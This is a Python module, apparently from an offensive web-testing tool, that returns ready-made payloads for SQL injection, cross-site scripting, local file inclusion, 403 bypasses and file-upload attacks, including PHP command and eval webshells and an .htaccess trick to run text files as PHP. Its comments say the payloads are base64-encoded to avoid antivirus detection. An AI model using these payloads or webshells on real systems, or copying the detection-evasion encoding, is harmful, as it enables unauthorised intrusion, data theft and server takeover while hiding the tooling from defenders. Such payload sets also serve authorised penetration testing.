"""
Smart Payload Generator - Generates context-aware payloads for various vulnerability types
This version uses base64 encoding to avoid triggering Antivirus software on the host.
"""
import random
import base64
from typing import List, Dict

class PayloadGenerator:
    """
    Generates smart payloads for XSS, SQLi, LFI, and more.
    """
    
    def __init__(self, target: str = ""):
        self.target = target
        
    def _decode_list(self, encoded_list: List[str]) -> List[str]:
        return [base64.b64decode(item).decode('utf-8') for item in encoded_list]

    def get_sqli_payloads(self) -> List[str]:
        """Returns a list of SQL injection payloads"""
        # Encoded to avoid AV detection
        encoded = [
            "JyBPUiAnMSc9JzE=",       # ' OR '1'='1
            "YWRtaW4nLS0=",           # admin'--
            "YWRtaW4nICM=",           # admin' #
            "YWRtaW4nLyo=",           # admin'/*
            "JyBVTklPTiBTRUxFQ1QgTlVMTCxOVUxMLE5VTEwtLQ==", # ' UNION SELECT NULL,NULL,NULL--
            "JzsgV0FJVEZPUiBERUxBWSAnMDowOjUnLS0=",          # '; WAITFOR DELAY '0:0:5'--
            "Jyk7IFNFTEVDVCBwZ19zbGVlcCg1KS0t"               # '); SELECT pg_sleep(5)--
        ]
        return self._decode_list(encoded)
        
    def get_xss_payloads(self) -> List[str]:
        """Returns a list of XSS payloads"""
        # Encoded to avoid AV detection
        encoded = [
            "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",          # <script>alert(1)</script>
            "Ij48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+",          # "><script>alert(1)</script>
            "JzthbGVydCgxKS8v",                               # ';alert(1)//
            "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==",      # <img src=x onerror=alert(1)>
            "amF2YXNjcmlwdDphbGVydCgxKQ==",                  # javascript:alert(1)
            "PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",                  # <svg onload=alert(1)>
            "e3tjb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcignYWxlcnQoMScpKCk9fQ==" # {{constructor.constructor('alert(1)')()}}
        ]
        return self._decode_list(encoded)
        
    def get_lfi_payloads(self) -> List[str]:
        """Returns a list of LFI payloads"""
        # Encoded to avoid AV detection
        encoded = [
            "Li4vLi4vLi4vZXRjL3Bhc3N3ZA==",                   # ../../../etc/passwd
            "Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",              # ../../../../etc/passwd
            "L2V0Yy9wYXNzd2Q=",                               # /etc/passwd
            "QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxkcml2ZXJzXFxldGNcXGhvc3Rz", # C:\\Windows\\System32\\drivers\\etc\\hosts
            "Li4uLi8vLi4uLi8vLi4uLi8vZXRjL3Bhc3N3ZA==",      # ....//....//....//etc/passwd
            "cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmRleC5waHA=" # php://filter/convert.base64-encode/resource=index.php
        ]
        return self._decode_list(encoded)
        
    def get_webshell_payloads(self) -> List[Dict]:
        """Returns a list of webshell payloads for upload testing"""
        # Encoded to avoid AV detection
        return [
            {
                "type": "php_cmd",
                "filename": "cmd.php",
                "content": base64.b64decode("PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+").decode('utf-8'),
                "description": "Simple PHP System Command Shell"
            },
            {
                "type": "php_eval",
                "filename": "eval.php",
                "content": base64.b64decode("PD9waHAgZXZhbCgkX1BPU1RbJ2NvZGUnXSk7ID8+").decode('utf-8'),
                "description": "PHP Eval Shell"
            },
            {
                "type": "htaccess_magic",
                "filename": ".htaccess",
                "content": base64.b64decode("QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAudHh0").decode('utf-8'),
                "description": "Htaccess trick to execute .txt as PHP"
            }
        ]
        
    def get_403_bypass_payloads(self, url: str) -> List[str]:
        """Returns a list of 403 bypass technique URLs"""
        return [
            url + "/.",
            url + "..;/",
            url + "?",
            url + "??",
            url + "//",
            url + "/./"
        ]

def get_payloads_for_category(category: str) -> List[str]:
    """Helper function to get payloads based on category name"""
    gen = PayloadGenerator()
    if category == "sqli":
        return gen.get_sqli_payloads()
    elif category == "xss": 
        return gen.get_xss_payloads()
    elif category == "lfi":
        return gen.get_lfi_payloads()
    elif category == "upload":
        return [p["content"] for p in gen.get_webshell_payloads()]
    return []
